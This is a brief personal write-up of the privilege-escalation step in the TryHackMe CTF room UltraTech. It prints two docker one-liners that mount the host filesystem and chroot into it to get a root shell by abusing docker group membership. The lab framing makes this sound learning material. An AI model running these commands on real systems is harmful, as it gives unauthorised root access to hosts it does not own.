in the ctf UltraTech on Tryhackme, i got stuck in the priv esc part. 

the current user (r00t) was in the docker group which caught my attention during the linpeas scan. after manually trying, i exhausted my options and decided to check out the write-ups.

i found out that it was as simple as running a one liner from GTFObins. 

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```
since the docker images avaialable on the system were of bash and not alpine so we just change apline to bash

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh
```
this spawned a root shell which was temporary but useful enough to solve the room

`LESSON LEARNT:`
check out permission flaws and use GTFObins for quick wins
